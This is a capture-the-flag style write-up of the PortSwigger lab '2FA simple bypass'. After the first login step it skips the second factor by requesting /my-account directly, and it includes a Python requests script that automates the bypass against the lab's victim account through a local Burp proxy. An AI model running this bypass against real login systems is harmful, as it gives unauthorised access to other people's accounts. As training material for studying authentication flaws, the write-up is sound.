---
title: "Authentication Vulnerabilities"
date: 2025-11-12
categories: [PORTSWIGGER]
tags: [BSCP]
image:
    path: https://i.pinimg.com/originals/f3/07/a7/f307a778044a9f81dd9637114f015032.gif


---
### **Authentication vulnerabilities** are weaknesses in the login or identity-verification process that allow attackers to impersonate users, access sensitive data, or break into systems. These flaws make it possible to bypass protections like passwords, tokens, or multi-factor checks and open the door for further attacks.

# LAB FROM PORTSWIGGER ACADEMY 
## LAB- 02: 2FA simple bypass | Nov 12, 2025

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass), you'll learn: 2FA simple bypass!

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.

- Your credentials: `wiener:peter`
- Victim's credentials `carlos:montoya`

## Exploitation

**Home page:**
![Home page](/assets/images/auth-2/hompage.png)

**Login as : `wiener`**

![Login as wiener](/assets/images/auth-2/loginaswiener.png)

**After login we got the field to enter the 4 digit 2fa code**

![Field to enter 2FA code](/assets/images/auth-2/fieldtoenter2fa.png)
![Burp login goes to login2](/assets/images/auth-2/burpLoginGoesTologin2.png)

**In here we are going to another login page see {response} that requires 4 digit security code.**

**Email Client :**
![Email Client](/assets/images/auth-2/EmailClinent.png)
**The email gives the security code now let's put that code to fully login as a wiener**

**After giving 2fa code to login:**
![Login page after security code](/assets/images/auth-2/loginPageafterSecurityCode.png)
![Burp after giving code](/assets/images/auth-2/burpAfterGivingCode.png)
**As we can also see here the response is going to the `/my-account?id=wiener` simple**

**Now we can login as `carlos:montoya` as can attempt to bypass the 2FA**
![Login as Carlos](/assets/images/auth-2/loginasCarlos.png)
![Carlos 2FA page](/assets/images/auth-2/carlos2fapage.png)
**Look in here since the response is coming from the another login i.e `login2` let's try changing it's own account i.e `my-account?id=carlos` technically let's just use: `/my-account`**

**Means in here we are techically logged in to username and password of `carlos` so why not try `/my-account`**

![Bypassed 2FA](/assets/images/auth-2/bypassed2fa.png)
**Nice going to the endpoint `my-account`actually bypass the 2fa security check , that means the application doesnot check that we entered the 2fa code or not.**

## Automating through Python : 
```python
import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecurePlatformWarning)

proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}



def access_Carlos(url,s):
    print("[+]Attempting to break the 2FA from the carlos i.e victim account")
    login_url = url +"/login"
    data = {"username":"carlos","password":"montoya"}
    # we will be sending a POST request hai
    req = s.post(login_url,data=data,verify=False,proxies=proxies)
    if "Please enter your 4-digit security code" in req.text:
        print("[+]YOu have successfully entered to 2fa verify page")
        
        # going to /my-account in place of /login2
        
        new_url = url +"/my-account"
        Cookie={"Cookie": "YOUR_COOKIE_VALUE"}
        req=s.get(new_url,verify=False,proxies=proxies,cookies=Cookie)
        
        if "?id=carlos" in req.text:
            print("[+] Congrats we successfully bypass the 2fa")
        else:
            print("[-]Try again don't worry")
    else:
        print("something wrong");
        exit(0)
    
    # now we will be having /my-account after login to get the page


def main():
    if len(sys.argv)!=2:
        print("(+)Usage %s <url>" % sys.argv[0])
        print("(+)Example %s www.example.com" % sys.argv[0])
    else:
        url = sys.argv[1]
        s= requests.Session()
        access_Carlos(url,s)




if __name__=="__main__":
    main()
```
**So this python script does the job as well to bypass this lab 2fa**

# What we've learned:

1. 2FA simple bypass
2. Automating this bug through python.